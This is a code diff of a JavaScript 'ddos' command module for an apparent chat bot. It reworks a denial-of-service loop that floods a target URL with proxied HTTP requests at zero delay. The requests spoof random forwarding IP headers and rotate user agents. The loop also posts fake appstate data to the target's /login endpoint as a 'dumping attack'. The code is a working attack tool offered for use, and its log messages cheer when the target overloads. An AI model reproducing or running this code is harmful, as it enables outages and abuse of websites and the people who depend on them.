@@ -3,15 +3,10 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const {
-    rainbow
-} = require("gradient-string");
+const { rainbow } = require("gradient-string");
+const { fakeState } = require("../system/fakeState.js");
 
-const {
-    fakeState
-} = require("../system/fakeState.js")
-
-module.exports.config = {
+module.exports["config"] = {
     name: "ddos",
     type: "tools",
     role: 3,
@@ -99,118 +94,116 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
-    if (!continueAttack) return;
-
-    const headersForRequest = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
-        "Accept": getRandomElement(acceptHeaders),
-        "Accept-Language": getRandomElement(langHeaders),
-        "Cache-Control": getRandomElement(cipherSuites),
-        "Referer": getRandomElement(referrers),
-        "Connection": "keep-alive",
-        "DNT": "1",
-        "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Pragma": getRandomElement(cipherSuites),
-        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
-        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-        "Host": url.replace(/https?:\/\//, "").split("/")[0],
-        "sec-fetch-site": "same-origin",
-        "Sec-Fetch-User": "?1",
-        "Origin": url.split("/").slice(0, 3).join("/"),
-        "X-XSS-Protection": "1; mode=block",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "If-None-Match": '"W/"5c-1f7b"',
-        "X-Requested-With": "XMLHttpRequest",
-        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
-        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
-        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
-        "Accept-Charset": "utf-8",
-        "Expires": "0",
-        "X-Content-Security-Policy": "default-src 'self';",
-        "X-Download-Options": "noopen",
-        "X-DNS-Prefetch-Control": "off",
-        "X-Permitted-Cross-Domain-Policies": "none",
-        "X-Powered-By": "PHP/7.4.3",
-    };
-
-    //dumping attack if endpoint body exist
-
-    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login",
-        {
-            state: fakeState(),
-        })
-    .then((response) => {
-        if (response.status === 200) {
-            console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"));
-        }
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+const checkStateExists = (url) => {
+    return axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
+        state: fakeState()
     })
-    .catch((err) => {
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
-    });
-
-
-
-    //normal http flood
-
-    axios
-    .get(url,
-        {
-            httpAgent: agent,
-            headers: headersForRequest,
-            timeout: 0,
-        })
-    .then((response) => {
-        if (response.status === 200) {
-            console.log(rainbow(`PING! Success ✓ (200)`));
-        }
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
-    })
-    .catch((err) => {
-        if (
-            err.code === "ECONNRESET" ||
-            err.code === "ECONNREFUSED" ||
-            err.code === "EHOSTUNREACH" ||
-            err.code === "ETIMEDOUT" ||
-            err.code === "EAI_AGAIN" ||
-            err.message === "Socket is closed"
-        ) {
-            console.log(rainbow("Unable to Attack Target Server Refused!"));
-        } else if (err.response?.status === 404) {
-            console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-        } else if (err.response?.status === 503) {
-            console.log(rainbow("Target under heavy load (503) - Game Over!"));
-        } else if (err.response?.status === 502) {
-            console.log(rainbow("Bad Gateway (502)."));
-        } else if (err.response?.status === 403) {
-            console.log(rainbow("Forbidden (403)."));
-        } else if (err.response?.status) {
-            console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-        } else {
-            console.log(rainbow(err.message || "ATTACK FAILED!"));
-        }
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
-    });
+    .then(response => response.status === 200 || response.status === 400)
+    .catch(() => false);
 };
 
 
+const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
+    if (!continueAttack) return;
 
-module.exports.run = async ({
+    checkStateExists(url).then(stateExists => {
+        const headersForRequest = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": sanitizeUA(getRandomElement(userAgents())),
+            "Accept": getRandomElement(acceptHeaders),
+            "Accept-Language": getRandomElement(langHeaders),
+            "Cache-Control": getRandomElement(cipherSuites),
+            "Referer": getRandomElement(referrers),
+            "Connection": "keep-alive",
+            "DNT": "1",
+            "Upgrade-Insecure-Requests": "1",
+            "TE": "Trailers",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Pragma": getRandomElement(cipherSuites),
+            "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+            "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+            "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+            "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+            "Host": url.replace(/https?:\/\//, "").split("/")[0],
+            "sec-fetch-site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "Origin": url.split("/").slice(0, 3).join("/"),
+            "X-XSS-Protection": "1; mode=block",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "If-None-Match": '"W/"5c-1f7b"',
+            "X-Requested-With": "XMLHttpRequest",
+            "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
+            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+            "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
+            "Accept-Charset": "utf-8",
+            "Expires": "0",
+            "X-Content-Security-Policy": "default-src 'self';",
+            "X-Download-Options": "noopen",
+            "X-DNS-Prefetch-Control": "off",
+            "X-Permitted-Cross-Domain-Policies": "none",
+            "X-Powered-By": "PHP/7.4.3",
+        };
+
+        if (stateExists) {
+            // Perform Dumping Attack if state exists
+            axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login",
+                {
+                    state: fakeState(),
+                })
+            .then((response) => {
+                requestsSent++;
+                checkCompletion(requestsSent);
+                setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+            })
+            .catch((err) => {
+                if (err.response.status === 400) {
+                    console.log(rainbow("Dumping ••• (400)"));
+                }
+                requestsSent++;
+                checkCompletion(requestsSent);
+                setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+            });
+        } else {
+            // Perform HTTP Flood Attack
+            axios.get(url, {
+                httpAgent: agent,
+                headers: headersForRequest,
+                timeout: 0,
+            })
+            .then((response) => {
+                if (response.status === 200) {
+                    console.log(rainbow(`PING! Success ✓ (200)`));
+                }
+                requestsSent++;
+                checkCompletion(requestsSent);
+                setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+            })
+            .catch((err) => {
+                if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+                    console.log(rainbow("Unable to Attack Target Server Refused!"));
+                } else if (err.response?.status === 404) {
+                    console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+                } else if (err.response?.status === 503) {
+                    console.log(rainbow("Target under heavy load (503) - Game Over!"));
+                } else if (err.response?.status === 502) {
+                    console.log(rainbow("Bad Gateway (502)."));
+                } else if (err.response?.status === 403) {
+                    console.log(rainbow("Forbidden (403)."));
+                } else if (err.response?.status) {
+                    console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+                } else {
+                    console.log(rainbow(err.message || "ATTACK FAILED!"));
+                }
+                requestsSent++;
+                checkCompletion(requestsSent);
+                setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+            });
+        }
+    });
+};
+
+module.exports["run"] = async ({
     args,
     chat,
     font
